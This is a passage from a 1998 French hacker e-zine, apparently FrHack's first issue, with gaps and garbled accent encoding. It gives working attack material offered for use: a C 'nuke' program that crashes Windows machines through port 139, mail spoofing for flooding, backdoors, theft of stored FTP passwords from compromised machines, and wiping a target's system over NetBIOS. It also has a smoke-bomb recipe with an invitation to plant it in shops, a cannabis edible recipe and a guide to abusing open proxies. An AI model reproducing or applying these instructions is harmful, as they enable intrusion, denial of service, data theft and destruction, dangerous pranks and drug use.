demande un login, on rentre une certaine variable exécutant directement une session telnet. Je ne me suis pas trop penché sur
 la manière de coder ce type de backdoor, mais sachez que c'est, je pense un des meilleur types de backdoor possibles.

Il existe encore d'autres type de backdoor notamment certaines allant modifier la valeur des registres mémoires du système 
mais je ne les ai pas pour l'instant étudiés.

Voilà ce premier texte sur les backdoors écrit par mes soins est finis si vous avez des question, commentaires, correction, 
ou informations supplémentaires, vous pouvez m'envoyer un mail a BuBle@altern.org ou me retrouver sur #hack.fr sur le
 réseau Undernet.

Remerciements:
Je tient a remercié ici Cleb, qui ma ouvert la voie quand j'étais franchement un débutant, je tient a saluer ici aussi mes potes: Xi9, Kthulu, les membres de hack.fr et tous les gens qui vont sur #hack.fr.
...
* Une ligne ressemblant a ceci est suppose apparaεtre:
...
* Ensuite inscrivez ceci : 
 ...
 DATA
 subject: Survie de notre planΦte
	Quand aller vous arrΦter de polluez notre planΦte !!!!
 .
 QUIT

(Certain serveur mail note l'adresse IP, alors ils est toujours prudent de passer par une 
passerelle pour eviter d'Ωtre retraτable...)

(Avant d'innonder le net de vos messages, envoyer en dont un α vous, question de verifier 
si ca fonctionne bien)

(Si τa fonctionne, n'hesiter pas α envoyer des messages α tous les site raciste ou de pΘdophilie
...
idee ;) le problΦme de cet back door est que si l'utilisateur va voir dans 
...
Cette mΘthode, pas trΘs employée en France, est pourtant de loin celle permet d'infiltrer le plus de systèmes 
(et en particulier de gros systΦmes).. En effet il permet d'exploiter la faille la plus grosse de toute entreprise ou système 
informatique : LE PERSONNEL !
Le social Engeenering est plus simplement l'art d'usurper l'identité d'autrui, l'action de se faire passer pour une personne que 
...
Bon, on va prendre une petite pause, et lire un petit texte Θcrit par vaToO
...
film a la  beaute  desertique  d'une  douleur  sans  fin  " devient "  Ce film a la
beaute squelettique d'une couleur sans teint". Vous ne plagiez pas vraiment et vous
...
etes avant que l'ordi soit totalement ouvert (en train de booter, pis y vous fo un pass de BIOS). Compris? Les autres vous pouvez sacré le 
...
lance 
le prog. apres l'avoir lancΘ se prog transformera sa machine en serveur ftp 
accessible a tous!
...
ceci:
        ...
        - elle donne acces α un port
        - elle se lance α chaque dΘmarrage
...
Il suffit apres τa de creer un executable ki fera ceci:
...
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=        
                        ...
                        //////=-||PHREAKING||-=\\\\\\
                        ΘÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
                        ⁿ Par CyberRider de DSK CREW ⁿ
                        ╖ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄδ
                        \\\\\\\\\\\=========//////////
...
exploits sont toujours lies a des programmes differents. Les exploits sont fait pour gagner le "root" sur les systemes 
d'exploitations. Ils marchent quand le programme utilise le "root". Sous les sytemes UNIX , les programmes utilisent 
souvent le "root" pour faire une tache specifique qui ne peux etre faite par un utilisateur normal. Bon les exploits crashent le 
programmes jusqu'a ce qu'ils obtiennent le "root" access. 

3) Comment utiliser des exploits ?
99% des exploits sont codes en "C", vous avez besoin d'un compte sur le systeme que vous voulez hacker pour utiliser un 
...
vous de connaitre votre "C". Apres avoir compiler l'exploit, vous serez capable de l'executer et si vous avez bien travaillez 
le "root" vous aurez. Mais, tous ces exploits ne sont pas les meme et ils necessitent des commandes differentes pour 
marcher.
...
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
                -= Ke faire kand on a reussi α entrer dans un ordi ? =-
                                    (par Majestix)

      C'est la l'un des points les plus dΘlicats existant dans la hacking,
On peut: 
        - partir (peu recommandΘ)
        - tout effacer (peu recommander aussi α part sur la machine d'un pΘdophile)
        - prendre les fichiers interressants (c'est le mieux !!)

Il serait un peu bΩte de partir aprΦs avoir reussi un piratage, ben vous vous
Ωtes donnΘ du mal pour entrer et aprΦs vous partez ???

Tout effacer aussi est rigoureusement idiot! Totu d'abord bonjour l'image qu'on 
donne des hackers! ensuite le gars ne vous a rien fait, non, c'est pas un truk α 
faire!


I. Ke faut-il recupΘrer ??
...
II. Mais pourkoi les recupΘrer ?

        Ces fichiers la sont tres utiles car ils vous ddonnent acces α ce α koi la
machine ke vous avez piratΘ a acces, comme d'autres machines, des ftp etc.

III. Ke faire apres cela?
        
        Utiliser ces fichiers, komman ? les .ini de ftp sont utilisable par le mΩme
...
ki est le plus souvent cryptΘ. Komman faire?
eh bien:
...
fichier .ini et regardez les PWD, ce sont les mots de passes ki sont cryptΘs.
voici komman wsftp(saufle pro) crypte ses donnΘs :
...
et j'ai dΘcodΘ rien de plus simple!!! faites en de mΩme pour les autres prog!

Le fichers lmhosts est un fichier ki est utilisΘ lors du piratage de certains 
...
que inscrire un ip dans une boite et peser sur un bouton " nuke him " J'ai dΘcider de vous 
dΘvoilΘ le fonctionnement d'un logiciel de nuke. 

#include <stdio.h>             
#include <string.h>
#include <winsock.h>                   /* ImplΘmente les fonctions TCP/IP */

#define PortDeNuke 139               /* le port d'attaque */

int x, s;
char *str = "FrHack";                    /* n'importe quel chaine α le mΩme effet */
...
int open_sock(int sock, char *server, short port) 
{
    ...
    /* Se connecter α l'ordinateur que nous dΘsirons nuker */
    if (connect(sock,(struct sockaddr *)&blah,16)==-1) 
    {
         /* Impossible de se connecter α l'ordinateur, fermer le socket */
         printf("Impossible de se connecter α l'ordinateur");
         closesocket(sock);
         return(-1);
    }
  /* Si il a aucune erreur alors nous somme connecter α l'ordinateur */
    printf("Connecter α [%s:%d].\n",server,port);
    return 0;
}
...
void main(int argc, char *argv[]) 
{
    ...
    /* VΘrifier si le paramΦtre ip est lα */
     if (argc != 2) 
     {
     ...
     if ( (int err = WSAStartup(wVersionRequested, &wsaData)) != 0 ) 
    {
     ...
     /* CrΘation d'une instance de socket */
     if ( (s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET)
    {
     ...
     /* Envoyer le packetm, c'est en rΘalitΘ cet ligne qui fait tout planter */
     send(s,str,strlen(str),MSG_OOB);
     printf("La personne est thΘoriquement nuker\n");
    /* Fermer le socket */
     closesocket(s);
}

Je tiens α remercier  _eci  et  _wfx  pour leurs prΘcΘdent code source concernant le nuke. Ce 
...
Elles ne vous sont soumises qu a unique but Θducatif. Enfin ca,tout le monde le sait deja...
...
LA PREMI╚RE VERSION DU CHEVAL (port 5000):


PremiΦrement, appuyez sur CTRL + ALT + SUPPR
...
Maintenant, vous n'Ωtes plus infectΘ de ce cheval!

_______________________________________________________

LA DEUXI╚ME VERSION DU CHEVAL (port OK):
...
arriver de windaube 95, la base de registre qui a prit une importance Θnorme et a 
pratiquement Θliminer les .ini. En gros la base de registre sert a entreproser les 
...
informations global a tous les utilisateur et au matΘriel, alors que le user.dat 
stocke seulement les informations pour un utilisateur (c'est pour ca que chaque 
utilisateur de windaube peut avoir ses prΘfΘrence a lui)

Comment peut-on hacker avec la page de registre... c'Est simple, en allant modifier	
des donnΘ de configuration α l'intΘrieur, on peut ainsi souvent enlever des protections
...
article pour ceux qui sont intΘresser aller lire l'api de windows, la fonction est
writeprofilestring si je me rappelle bien (je dit ca de mΘmoire)
...
REGEDIT4
; Ceci est un exemple fichier mettant α jour la base de registre
; les ligne commancant par un ; sont des commentaire

;========================================
;  Faire que la page de dΘmarrage de windaube inet explorer devienne la page de frhack
;========================================

[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer]
"start page"="www.frhack.org"

; la ligne [] signifi la clΘ, la " " avant le = est pour la sous-clΘ
; et le "" est pour la valeur de cet clΘ (en passant les "" sont obligatoire)

--------< Couper ici >------------------

Bon passons a des exemple plus pratique: vous trouvez un pΘdophile sur internet, dΘcider α aider
la planete vous voulez scraper son ordi (Truc: comme il s'agit d'un pΘdophile con et lame, 
enlever seulement les fichier genre le command.com et marquer dans l'autoexec.bat en commentaire
une note comme koi qui a des photo de pΘdo sur l'ordi dans tel rΘpertoire, comme l'ordi sera
scap il va aller le faire rΘparer et vous avez une chance sur deux que les techniciens le dΘnonce)
Vous utiliser l'exploir netbios (yΘ a qq dans ce emag) pis oui, il a a son C partager (toujours 
...
(hum, intΘressant) il sont coder et j'ai pas encore eu le temps de vΘrifier l'algorithme
(j'ai penser a Θcrire cet article 1 heure avant la sorti de frhack # 1) mais on va se simplifier
...
2) Aller dans la base de registre α la clΘ suivante:
Local machine->software->microsoft->windows->

3) localiser vous devriez voir deux sous-clΘ
   1) "parm1enc"="73 C8 05 E7 10 E2"
   2) "parm2enc"="73 C8 05 E7 10 E2"

73,C8,05,E7,10,E2
la premiere contient le mot de passe de lecture, l'autre de l'Θcriture


4) copier la valeur a quelque part pour pas l'oublier
   
5) crΘer un fichier texte (qui sera un .reg)
...
; c'est p-e pas trΦs clair mais en tout cas ca vous dit les principes de bases
; 
...
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-
                               ...
                               -=La Bombe fumogΦne=-
                               ¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿
Le contenu de ce texte est α but informatif seulement et nous nous tenons
pas responsable de l'usage que vous pouvez en faire.
                                                        KneWoN

 Pour RΘaliser la bombe fumogΦne,vous avez besoin
de: 
    -SalpΩtre(*nitrate de sodium(ou potassium...)) /* de po
    -Sucre
    -Eau
    -PoΩle(les ronds)
    -Plaque α buiscuits(plaque en mΘtal)
    -Papier d'alluminium

* :Je ne suis pas trop sur du nom scientifique du 
   salpΩtre.

╔tape #1:SE PROCURER DU SALP╩TRE
...
╔tape #2:FAIRE LE M╔LANGE
         Prendre du salpΩtre,pas trop,le mettre dans un bol avec du sucre(je ne sais pas 
         exactement les doses...vous n'avez qu'α expΘrimenter et vous allez dΘcouvrir ce 
         qui vous suffit;c'est pour celα que je vous conseille de commencer par de petites
         doses).Ajouter de l'eau(pas trop) pour former une pΓte.Vous avez votre mΘlange.

╔tape #3:LA CUISSON
         Former une petite boite en papier d'aluminium  dans laquelle vous dΘposez le mΘlange.
         Ouvrez les ronds de votre poele.DΘposez la plaque α biscuits sur le rond.Mettre la 
         boite d'aluminium contenant le mΘlange sur la plaque(au dessus du rond pour la 
         meilleur cuisson et rΘpartition). Attendre que le salpΩtre devienne de couleur 
         Beige jusqu'α Brun pΓle(Surveillez bien τa car τa pourrait prendre en feu...).Fermer 
         le rond et retirer la boite d'aluminium.

╔tape #4:LA TOUCHE FINALE
         Laisser sΘcher le tout.Pour des rΘsultats rapides, vous pouvez le mettre dans le 
         congΘlateur.Vous  pouvez aussi enfoncer une mΦche dans le mΘlange pendant qu'il est 
         encore mou(dΘpendant des prΘfΘrences).

╔tape #5:VOUS ╩TES PR╩TS?
         Votre bombe est maintenant prΩte.Il suffit de mettre feu α la croute ou α la mΦche 
         si vous en avez une.     
         ATTENTION!!! Le feu yΘ pomal chaud...quand la bombe est pognΘe...τa fait fondre 
                      le papier d'aluminium.

 J'espΦre que celα vous a amusΘ et si jamais il y a des erreurs,informations complΘmentaires 
ou suggestions, n'hΘsitez pas α me contacter (#hack.fr sur undernet ou bin knewon@hotmail.com).
DerniΦre recommandation...ne faites pas τa au four... Je sais de quoi je parle. Vous allez bien 
vous amuser si vous en placez dans les Θpiceries et les dΘpanneurs... hehe

P.S.:Je vais surement Θcrire un texte complΘmentaire au sujet de fabrication de mΦches 
...
Pour le premier numΘro du zine de hack.fr j'ai dΘcidΘ de vous lΓcher 
la cΘlΦbre recette du SPACE YOGOURT...

Ce qu'il vous faut rΘunir :

   - Un yogourt nature (0% de matiΦre grasse pour les meufs :)
   - De l'huile de tournesol (huile vΘgΘtale pour friture...)
   - Une grande cuillΦre
   - Un petit bol en terre cuite...
   - 2 grammes de rΘsine de Cannabis

La recette :

DΘmouler le yogourt dans le bol, s'il y α de l'eau, Θgouttez-la.
Effriter vos 2 grammes dans la cuillΦre (Θvitez de faire de trop grosses
boulettes) puis mettez l'huile de tournesol par-dessus, jusqu'au quasi
remplissage de la cuillΦre.
Passer la cuillΦre sur la flamme d'une cuisiniΦre (Θviter le briquet).
Attention ! ╟a va devenir trΦs chaud !!!! pour ne pas vous br√ler tenez
le manche de la petite cuillΦre avec une serviette.
Quand l'huile commence α frΘmir plongez d'un coup sec la cuillΦre dans 
le bol contenant le yogourt.
Remuez Θnergiquement.

DΘgustation :

Ce Space Yogourt est parfait pour une personne,
Ne pas le laissΘ reposer, dΘgustez-le de suite aprΦs l'avoir fait,
Il sera tiΦde, α la bonne tempΘrature...
Le Space Yogourt est excellent nature mais pour ceux qui trouverait son 
go√t un peu fade vous pouvez rajouter de petits morceaux de menthe fraεche.

Effets :

Sur le coup vous n'allez pas sentir grand chose, 
c'est pour cela que vous finirez le Space Yogourt, 
mais dans les 5 minutes qui suivront la dΘgustation vous allez ressentir 
comme une Θnorme claque qui va carrΘment vous scotcher α votre fauteuil 
!! 
vous ne pourrez pas bouger pendant environ 5 minutes, 
votre tΩte va se mettre α tourner α 160 km/h TOP fUN! :)
une fois ces 5 minutes passΘes tout redeviendra normal ! puis toutes les 
demi-heures cela vous refera cet effet !!! Pendant environ 2 heures pour
les initiΘ et 6 heures pour les novices...
Accoutumance au Cyber Yogourt ? : aucune.

vOILA bon Hack et bonne dΘfonce aprΦs :)

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-
                                      * Les Wingates *

On entend souvent parler sur les channels de hack de wingate. Sous ce nom barbare, ce cache en 
fait la derniere technique a la mode pour masquΘ son adresse IP.
...
Lors de l'installation de wingate sur une becane, les services suivant sont installΘ:
port	service

23	serveur proxie telnet		installation standart
1080	serveur de SOCK			installΘ en plus si on utilise gatekeeper
6667	proxie irc			installΘ en plus si on utilise gatekeeper

a) Le serveur proxie telnet
Lors de  l'installation, aucun mot de passe n'est demandΘ, ni une fois l'installation terminΘ, ce 
qui constitue une faiblesse. Cette abscence de mot de passe est la cause des probleme due a 
l'utilisation des wingates. L'utilisation de wingate est des plus aisΘ, exemple:
...
(le premier parametre est le l'adresse, la deuxiΦme est le port)
...
Et voila, ceci Θtait le premier emag de FrHack, nous esperons  que vous avez aimΘ, nous 
comptons sortir un autre numΘro le mois prochain 1 aout 1998, (si aucun d'entre nous
se fait buster entre temps, mais la scene survit toujours a un bust, alors il devrai
avoir un numΘro en aout) Pour plusieurs d'entre nous il s'agit de notre premier emag, 
alors nous avons apprit sur le tas, et nous sommes pas mΘcontant du rΘsultat, avant de
...
(super au retour d'en hacking/phreaking tour), au hackeur en gΘnΘral, au monde qui
vienne sur #hack.fr et lui permette d,etre une place intΘressante ou on peut parler
en toute tranquillitΘ, aussi un remerciment a tout les rebelle et rΘvolutionnaire
qui se batte pour la libertΘ individuele et a tous les autres que j'ai oublier de parler
pis qui se sente d'accord avec ce mag. 
                       
         -= Pourkoi prΘdir le futur quand nous pouvons l'inventer ?? =-
                                                       (Utopiste)
